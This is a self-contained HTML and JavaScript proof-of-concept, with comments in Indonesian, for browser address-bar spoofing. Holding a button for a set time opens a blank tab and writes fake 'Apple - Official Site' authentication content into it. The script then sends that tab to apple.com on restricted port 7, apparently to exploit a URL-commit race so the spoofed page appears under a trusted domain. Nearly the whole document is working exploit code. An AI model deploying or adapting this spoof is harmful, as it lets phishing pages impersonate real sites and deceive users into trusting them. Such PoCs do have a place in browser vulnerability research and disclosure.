<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
    <title>Advanced Long-Press & Invalid Port Spoofing PoC</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #0b0e14;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        color: #f0f6fc;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .container { text-align: center; max-width: 650px; padding: 20px; }
      button {
        padding: 18px 36px;
        font-size: 16px;
        font-weight: 600;
        background: #da3633;
        color: #fff;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
        user-select: none;
        -webkit-user-select: none;
        transition: transform 0.1s, background 0.2s;
      }
      button:active { background: #b62324; transform: scale(0.98); }
      .info {
        margin-top: 20px;
        font-size: 13px;
        color: #8b949e;
        font-family: monospace;
        word-break: break-all;
      }
      .progress-bar {
        width: 100%;
        height: 4px;
        background: #21262d;
        border-radius: 2px;
        margin-top: 15px;
        overflow: hidden;
        display: none;
      }
      .progress-fill {
        width: 0%;
        height: 100%;
        background: #58a6ff;
        transition: width 0.05s linear;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <!-- Tombol dengan interaksi tekan lama (Hold / Long-Press) -->
      <button id="holdBtn">PRESS & HOLD TO INITIALIZE CHAIN</button>
      <div class="progress-bar" id="progressBar"><div class="progress-fill" id="progressFill"></div></div>
      <div class="info" id="statusInfo">Status: Ready. Press and hold the button for 1.5 seconds.</div>
    </div>

    <script>
      const btn = document.getElementById("holdBtn");
      const statusInfo = document.getElementById("statusInfo");
      const progressBar = document.getElementById("progressBar");
      const progressFill = document.getElementById("progressFill");

      let holdTimer = null;
      let progressInterval = null;
      let startTime = null;
      const HOLD_DURATION = 1500; // Durasi tekan dalam milidetik

      // Fungsi untuk memulai interaksi tekan
      function startHold(e) {
        e.preventDefault();
        if (holdTimer) return;

        statusInfo.innerText = "Status: Holding... Keep pressing to maintain preview state.";
        progressBar.style.display = "block";
        startTime = Date.now();

        // Animasi progress bar interaksi
        progressInterval = setInterval(() => {
          const elapsed = Date.now() - startTime;
          const percent = Math.min((elapsed / HOLD_DURATION) * 100, 100);
          progressFill.style.width = percent + "%";
        }, 30);

        // Timer utama setelah durasi tekan tercapai
        holdTimer = setTimeout(() => {
          cleanupHold();
          executeExploitChain();
        }, HOLD_DURATION);
      }

      // Fungsi untuk membatalkan jika tombol dilepas sebelum waktunya
      function cancelHold() {
        if (!holdTimer) return;
        clearTimeout(holdTimer);
        cleanupHold();
        statusInfo.innerText = "Status: Interaction cancelled (released too early).";
      }

      function cleanupHold() {
        clearInterval(progressInterval);
        holdTimer = null;
        progressFill.style.width = "0%";
        progressBar.style.display = "none";
      }

      // Event listener untuk mendukung perangkat sentuh maupun mouse desktop
      btn.addEventListener("mousedown", startHold);
      btn.addEventListener("mouseup", cancelHold);
      btn.addEventListener("mouseleave", cancelHold);
      
      btn.addEventListener("touchstart", startHold);
      btn.addEventListener("touchend", cancelHold);

      function executeExploitChain() {
        statusInfo.innerText = "Status: Opening target window context...";
        btn.style.display = "none";

        // Membuka jendela baru via about:blank
        const newTab = window.open("about:blank", "_blank");

        if (!newTab) {
          statusInfo.innerText = "Status: Failed - Popup blocked by browser policy.";
          return;
        }

        try {
          statusInfo.innerText = "Status: Injecting custom deceptive DOM payload...";

          const payloadHTML = `
            <!DOCTYPE html>
            <html>
            <head>
              <title>Apple - Official Site</title>
              <style>
                body {
                  margin: 0; background: #ffffff; color: #1d1d1f;
                  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                  display: flex; align-items: center; justify-content: center;
                  height: 100vh; text-align: center;
                }
                .box { padding: 40px; }
                h1 { font-size: 40px; color: #d70015; margin-bottom: 10px; }
                p { font-size: 22px; color: #0066cc; }
              </style>
            </head>
            <body>
              <div class="box">
                <h1>AUTHENTICATION GATEWAY</h1>
                <p>Verifying secure session transition...</p>
              </div>
            </body>
            </html>
          `;

          newTab.document.open();
          newTab.document.write(payloadHTML);
          newTab.document.close();

          statusInfo.innerText = "Status: DOM injected. Forcing navigation via invalid restricted port...";

          // Kombinasi Invalid / Restricted Port untuk memaksa penundaan/kegagalan commit URL (Race Condition)
          // Port seperti 7 (ECHO) atau 1 (MUX) secara historis diblokir atau memicu ERR_UNSAFE_PORT
          setTimeout(() => {
            try {
              // Mengarahkan ke port terlarang/tidak valid pada domain target untuk menguji penanganan error/commit race
              newTab.location.href = "https://apple.com:7/spoof-test";
              statusInfo.innerText = "Status: Invalid port navigation dispatched.";
            } catch (navErr) {
              statusInfo.innerText = "Status: Navigation caught by policy: " + navErr.message;
            }
          }, 600);

        } catch (e) {
          statusInfo.innerText = "Status: Execution error - " + e.message;
        }
      }
    </script>
  </body>
</html>
